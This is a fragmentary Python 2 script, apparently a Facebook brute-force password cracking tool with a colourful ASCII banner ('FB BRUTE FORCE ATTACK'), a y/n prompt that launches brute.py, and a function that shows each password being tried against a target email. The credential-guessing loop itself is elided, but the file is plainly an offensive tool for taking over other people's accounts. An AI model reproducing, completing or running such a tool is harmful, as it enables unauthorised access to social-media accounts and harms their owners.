...
def banner():
    os.system('clear')
    print " "
    runntxt(GL+"              I'm_Ur_Hari. ^_^")
    runntxt(WW+"     ___    ___  _______  _____	 _	")
    runntxt(WW+"    |	|__|   ||  	||     || |	")
    runntxt(GL+"    |    __    ||   _   ||  _  /| |	")
    runntxt(GG+"    |___|  |___||__| |__||_| |_\|_|	")
    runntxt(Y+" ##########################################")
    runntxt(GG+"########################################## ")
    time.sleep(1.5)
    print GG+"  √=============================================√"
    print GL+"  |••••••   FB BRUTE FORCE ATTACK-HARI.   ••••••|"
    print GG+"  √=============================================√"
...
def pil():
                print GG+" "
                g = str(raw_input("[?] Try cheyyano Bro..\033[93;1m[y/n]: "))
                if g == 'y' or g == 'Y':
                    os.system('python2 brute.py')
                elif g == 'n' or g == 'N':
                    print wd+"Purathu povaano chunke..."
                    sys.exit()
                else:
...
def hari(hari_password):
  try:
 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m #@R!-W@!T!NG-4-P@$$ ==> \033[91m[\033[90;1m"+hari_password)
	sys.stdout.flush()
        ...
        -o:  -.......        ..       `:o-
         `:o:``....--        ..     `:o:`
           `:+/-`  `-        ..  `-/+:`
             ...
             Powered by:\033[97m I'm_Ur_Hari
      """
